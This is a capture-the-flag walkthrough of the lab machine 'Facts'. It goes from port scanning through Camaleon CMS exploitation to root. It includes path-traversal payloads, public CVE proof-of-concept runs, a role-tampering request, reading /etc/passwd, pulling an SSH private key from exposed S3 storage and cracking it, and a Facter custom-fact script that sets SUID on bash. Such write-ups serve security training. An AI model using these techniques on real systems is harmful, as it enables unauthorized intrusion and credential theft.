# Facts
---

<img width="1594" height="282" alt="image" src="https://github.com/user-attachments/assets/dbe006c0-dc8a-4c86-b234-4431281c006b" />

## Nmap Scan

```
nmap -sCV -Pn 10.129.234.216
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-25 11:20 EDT
Nmap scan report for facts.htb (10.129.234.216)
Host is up (0.38s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-server-header: nginx/1.26.3 (Ubuntu)
|_http-title: facts
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.35 seconds
                                                                        
```

## gobuster

```
gobuster dir -w /home/kali/Downloads/wordlists/directory-list-2.3-medium.txt -u http://10.129.234.216
```

<img width="1447" height="564" alt="image" src="https://github.com/user-attachments/assets/0cdb2def-b377-4033-a348-1e5a441e0157" />

> ### let's look at each endpoint we found 

## **`robots`**

```
http://facts.htb/robots
```

### found sitemap of website

<img width="838" height="101" alt="image" src="https://github.com/user-attachments/assets/962a7602-2ec6-410f-b180-3687d4259271" />

```
http://facts.htb/sitemap
```

<img width="1900" height="705" alt="image" src="https://github.com/user-attachments/assets/dc897128-4109-40b7-8e31-9d279f1477a6" />

## **`admin`**

```
http://facts.htb/admin/login
```

<img width="587" height="797" alt="image" src="https://github.com/user-attachments/assets/544c16c7-0a1d-4d92-a9c1-1b441eaaaaba" />

### when look at **`/page`** found there is two pages

```
http://facts.htb/page?page=2
```

> i will try lfi payloads

```
?page=../../../../etc/passwd
?page=../../../../var/log/apache2/access.log
?page=....//....//....//etc/passwd
?page=..%2f..%2f..%2f..%2fetc/passwd
?page=..%252f..%252fetc/passwd
```

> ### but nothing work 

## now let's see **`/amdin`**

```
http://facts.htb/admin/login
```

> while create new account found that **`admin`** username is taken so i will try to see if i can brute force password

<img width="1510" height="345" alt="image" src="https://github.com/user-attachments/assets/87e8d301-79fa-4ec5-8bab-c5c3001ecafe" />

> ### but when look at response found **`authenticity_token`** parameter that is mean there is uniq token for each request so it will not work exept i use micro 

> ## let's first login with account i create 

```
frank : 123456
```

<img width="1919" height="757" alt="image" src="https://github.com/user-attachments/assets/4b796360-8b97-48cf-b739-1669e2a7c955" />

> ### found that website work with cms call **`Camaleon CMS`** with version **`Version 2.9.0`**

```
Camaleon CMS | Version 2.9.0
```

### after search on exploits to this cms found

<img width="1143" height="403" alt="image" src="https://github.com/user-attachments/assets/aefeb130-6d3f-4a05-b971-fc633b09a8e2" />

## [CVE_poc](https://github.com/d3vn0mi/cve-2025-2304-poc)

```
git clone https://github.com/d3vhthnnni/cve-2025-2304-poc.git
cd cve-2025-2304-poc

---

pip install -r requirements.txt
```

## now use it 

```
python3 exploit.py http://facts.htb/admin/login -u frank -p 123456
```

<img width="1038" height="351" alt="image" src="https://github.com/user-attachments/assets/bc54d3b2-5613-4539-b5f6-e6570fcad3d8" />

## that is prove website vulnerable 

## i get back to dashboard found

<img width="1919" height="648" alt="image" src="https://github.com/user-attachments/assets/a2a2eaf1-a4fe-41dd-8e49-4bad00d35bea" />

<details>
   <summary>without using CVE ⚠️🔴🔴</summary>

## when look at profile and send reset password request found 

<img width="1393" height="512" alt="image" src="https://github.com/user-attachments/assets/ccbe398e-7cb9-4af8-92db-dd9b67659a75" />

The intercepted request revealed that password updates were processed through the `/admin/users/6/updated_ajax` endpoint using a POST request. The request body contained parameters responsible for updating the password fields, including `password[password]` and `password[password_confirmation]`, along with an authenticity token used for CSRF protection.

During inspection of the request structure, I noticed that user-related attributes were passed as nested parameters within the request body. This raised the possibility of parameter tampering, specifically targeting fields that might not be properly validated or restricted by the backend application.

To test this theory, I appended an additional parameter to the request body:

```ruby
password[role]=admin
```

This modification attempted to assign the **admin** role to my account during the password update process. After adjusting the request and updating the content length accordingly, I sent the modified request through Burp Repeater.

The server responded with an **HTTP 200 OK** status and issued updated session cookies, indicating that the request had been successfully processed without triggering validation errors or authorization checks. The absence of input filtering or role enforcement suggested that the application accepted the manipulated parameter and applied it to the user account.

This behavior confirmed the presence of a **parameter tampering vulnerability**, allowing modification of user privilege levels through unauthorized request manipulation. By exploiting this flaw, I was able to elevate my account privileges beyond the originally assigned role.

With administrative privileges potentially obtained through this vulnerability, I proceeded to re-evaluate accessible functionality within the CMS backend to identify further exploitation opportunities

   
</details>

## Privilege Escalation Confirmation

Previously, my account had limited access within the backend panel. After re-authentication, the navigation sidebar displayed several additional administrative modules, including **Contents**, **Media**, **Comments**, **Appearance**, **Plugins**, **Users**, and **Settings**. The presence of these sections confirmed that my account had been granted elevated privileges consistent with an administrator role.

<img width="1892" height="297" alt="image" src="https://github.com/user-attachments/assets/e5444102-7eb0-4664-84ea-6a9a695d250c" />

During this research phase, I discovered CVE-2024-46987, a vulnerability affecting Camaleon CMS. The vulnerability is classified as a Path Traversal flaw that allows authenticated users to perform arbitrary file reads through the application’s MediaController. Successful exploitation of this vulnerability can expose sensitive server-side files, including configuration files, credentials, and application secrets.

## [CVE-2024-46987](https://github.com/Goultarde/CVE-2024-46987)

```
python exploit.py -u http://facts.htb --user frank -p 123456 /etc/passwd | tail
```

<img width="1056" height="269" alt="image" src="https://github.com/user-attachments/assets/e5313c1c-50db-4b14-b772-41105dd10167" />

- the output disclosed two regular user accounts: `trivia` and `william`.

## Cloud Storage Credential Discovery

> While navigating through the admin interface, I accessed Settings → General Site and selected the Filesystem Settings tab. This section contained configuration details related to external file storage used by the CMS.

### I discovered that the application was configured to store files using AWS S3. The configuration page exposed several sensitive credentials, including the AWS access key, secret key, and associated region. The settings also revealed the configured S3 bucket name and endpoint information, indicating that the CMS relied on cloud-based storage for handling uploaded content.

<img width="1915" height="776" alt="image" src="https://github.com/user-attachments/assets/7f9138db-b2f6-4f58-8d4c-ebaf59753bcb" />

## AWS S3 Enumeration

```
aws configure                       
```

<img width="781" height="196" alt="image" src="https://github.com/user-attachments/assets/aab07180-5dae-476a-8a75-a4dd083da7e6" />

```
aws s3 ls --endpoint-url http://facts.htb:54321
```

<img width="353" height="57" alt="image" src="https://github.com/user-attachments/assets/8cae19ca-f577-4000-8da0-807040043178" />

<img width="627" height="131" alt="image" src="https://github.com/user-attachments/assets/4986a8a5-249a-406f-ad51-4a5772fcc1c7" />

## let's see internal 

```
aws s3 ls s3://internal/ --endpoint-url http://facts.htb:54321
```

<img width="954" height="212" alt="image" src="https://github.com/user-attachments/assets/19a7335b-461c-4ef2-bb61-8d496ecbe36e" />

## let's see what is inside **`.ssh`**

```
aws s3 ls s3://internal/.ssh/ --endpoint-url http://facts.htb:54321
```

<img width="832" height="132" alt="image" src="https://github.com/user-attachments/assets/8fbb2d77-a2c2-4c3a-8ae0-ae4b47e4c7fb" />

## found private key **`id_ed25519`**

## SSH Key Extraction

```
aws s3 cp s3://internal/.ssh/id_ed25519 ./ --endpoint-url http://facts.htb:54321
```

<img width="889" height="153" alt="image" src="https://github.com/user-attachments/assets/6d45cf32-1ad3-475c-a106-58bc5ebf293a" />

```
chmod 600 id_ed25519
ssh2john id_ed25519 >> ssh.hash
john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="1034" height="271" alt="image" src="https://github.com/user-attachments/assets/69d26e85-3f27-4897-9685-b38c63bf5400" />

```
dragonballz
```

> With the SSH private key and recovered passphrase available, I attempted to authenticate to the target system as the trivia user using the extracted key:

```
ssh -i id_ed25519 trivia@facts.htb
```

<img width="903" height="165" alt="image" src="https://github.com/user-attachments/assets/af48e1fc-403c-4459-947a-7b5120d519b2" />

## user flag

<img width="942" height="225" alt="image" src="https://github.com/user-attachments/assets/2dfe6256-99a9-43cf-b90a-43dc5489e279" />

## priv esc

```
sudo -l
```

<img width="1214" height="158" alt="image" src="https://github.com/user-attachments/assets/e36405b6-f237-482d-917b-dc4a037157f2" />

> ### lol

<img width="1054" height="265" alt="image" src="https://github.com/user-attachments/assets/ad9ad92b-5159-482e-906c-40115819271a" />

## Privilege Escalation via Facter Custom Fact Injection

> Since the sudo -l output revealed that the trivia user could execute /usr/bin/facter as root without a password, I investigated how Facter processes external input. Facter supports loading custom facts from user-specified directories, which raised the possibility of injecting malicious Ruby code that would execute with elevated privileges.

### To test this, I created a directory to host a malicious custom fact:

```
mkdir -p /tmp/exploit_facts
cd /tmp/exploit_facts/
    
```

> ### I then created a Ruby script that would act as a custom fact. The script was designed to execute a privileged command that sets the SUID bit on /bin/bash, allowing it to run with root privileges:

```
cat > /tmp/exploit_facts/exploit.rb << 'EOF'
#!/usr/bin/env ruby
puts "custom_fact=exploited"
system("chmod +s /bin/bash")
EOF
    
```

> #### With the malicious fact prepared, I executed facter while specifying the custom directory containing the injected script:

````
sudo /usr/bin/facter --custom-dir=/tmp/exploit_facts/ x
````

<img width="920" height="92" alt="image" src="https://github.com/user-attachments/assets/9fa38d0f-3447-4c18-918e-27798f42d2a9" />

> #### The command successfully executed and returned the output custom_fact=exploited, confirming that the custom Ruby code was executed with root privileges.

> To verify whether the payload executed successfully, I checked the permissions of /bin/bash:

```
ls -la /bin/bash
```

<img width="586" height="77" alt="image" src="https://github.com/user-attachments/assets/365b21ad-a250-4b27-aad6-4a7d27447929" />

```
bash -p 
whoami
```

<img width="663" height="150" alt="image" src="https://github.com/user-attachments/assets/6ee00dce-4b48-442d-b012-dda2100ecea5" />

